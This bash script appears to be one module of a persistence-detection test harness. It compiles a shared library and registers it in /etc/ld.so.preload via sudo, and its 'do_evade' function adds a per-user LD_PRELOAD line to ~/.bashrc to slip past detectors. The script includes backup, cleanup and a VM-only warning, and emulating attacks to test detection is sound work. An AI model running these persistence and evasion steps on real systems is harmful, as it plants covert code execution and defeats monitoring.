#!/usr/bin/env bash
# Implant 6 — LD_PRELOAD via /etc/ld.so.preload.
# Persistence: a shared library listed in /etc/ld.so.preload gets loaded
# into every new process on the system (needs root).
# MITRE ATT&CK: T1574.006 (Hijack Execution Flow: Dynamic Linker Hijacking).
#
# DANGER (see proposal section 9): a broken library listed here can break
# every program on the box, including the shell you'd use to fix it. Only
# run this in a VM with a "clean" snapshot ready to revert to.
PD_TECH="ld_preload"
source "$(dirname "$(readlink -f "$0")")/lib.sh"

PRELOAD_FILE="/etc/ld.so.preload"
SRC_FILE="$PD_IMPLANT_DIR/ld_preload.c"
SO_FILE="$PD_STATE_DIR/libpdpersist.so"

do_paths() { echo "$PRELOAD_FILE"; }

_build_so() {
  command -v gcc >/dev/null || pd_die "gcc not found (run setup.sh first)"
  [ -f "$SO_FILE" ] && [ "$SO_FILE" -nt "$SRC_FILE" ] && return 0
  gcc -shared -fPIC -O2 \
    -DPD_MARKER_FILE_PATH="\"$PD_MARKER_FILE\"" \
    -DPD_IMPLANT_DIR_PATH="\"$PD_IMPLANT_DIR\"" \
    -o "$SO_FILE" "$SRC_FILE" \
    || pd_die "failed to compile $SRC_FILE"
  pd_info "compiled $SO_FILE"
}

do_plant() {
  _build_so
  pd_backup "$PRELOAD_FILE" "sudo"
  # One .so path per line in ld.so.preload; keep any existing entries.
  # (The file is normally world-readable, so no sudo needed just to check.)
  if [ -f "$PRELOAD_FILE" ] && grep -qxF "$SO_FILE" "$PRELOAD_FILE" 2>/dev/null; then
    : # already present
  else
    printf '%s\n' "$SO_FILE" | sudo tee -a "$PRELOAD_FILE" >/dev/null
  fi
  pd_info "planted: $SO_FILE now loads into every new process (root)"
}

do_cleanup() {
  pd_restore "$PRELOAD_FILE" "sudo"
  pd_info "cleaned up"
}

# Real trigger: just spawn any ordinary process. /etc/ld.so.preload applies
# to it automatically — no special invocation needed.
do_trigger() {
  /bin/true
  pd_info "spawned a process under the preloaded library"
}

# Evasion: same payload, but loaded only for processes this user's shell
# spawns (via LD_PRELOAD in ~/.bashrc) instead of system-wide. No root
# needed, and a detector that only watches /etc/ld.so.preload never sees it.
do_evade() {
  _build_so
  pd_add_block "$HOME/.bashrc" "export LD_PRELOAD=\"$SO_FILE\${LD_PRELOAD:+:\$LD_PRELOAD}\""
  pd_info "evasion planted via per-user LD_PRELOAD in ~/.bashrc (not /etc/ld.so.preload)"
}

pd_main "$@"
